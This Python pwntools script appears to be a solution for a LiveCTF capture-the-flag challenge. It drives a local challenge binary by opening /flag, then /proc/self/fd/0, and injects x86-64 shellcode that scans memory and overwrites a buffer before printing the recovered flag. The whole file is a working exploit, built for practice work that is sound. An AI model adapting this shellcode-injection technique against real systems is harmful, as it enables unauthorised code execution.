#!/usr/bin/env python3

from pwn import *
import re

context.arch = "amd64"
context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

# r = remote(HOST, int(PORT))
r = process("../handout/challenge")

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/flag")

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/flag")

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/proc/self/fd/0")

r.send(asm("""
    call A
A:
    pop rdx
ZALOOP:
    mov rax, 8882879963476683084
    cmp QWORD PTR [rdx], rax
    je FOUND
    dec rdx
    jmp ZALOOP
FOUND:
    mov rdi, QWORD PTR [rdx]
    
    mov rsi, rbp
    sub rsi, 0x28
    mov rsi, QWORD PTR [rsi]
    add rsi, 0x0c
    mov rdi, QWORD PTR [rdx]
    mov QWORD PTR [rsi], rdi
    mov rdi, QWORD PTR [rdx+8]
    mov QWORD PTR [rsi+8], rdi
    mov rdi, QWORD PTR [rdx+16]
    mov QWORD PTR [rsi+16], rdi
    mov rdi, QWORD PTR [rdx+24]
    mov QWORD PTR [rsi+24], rdi
    ret
"""))

gdb.attach(r)

r.sendlineafter(b"Choice:", b"2")
print(re.findall(rb'LiveCTF{[^}{}]+}', r.recvall(timeout=3))[0].decode())
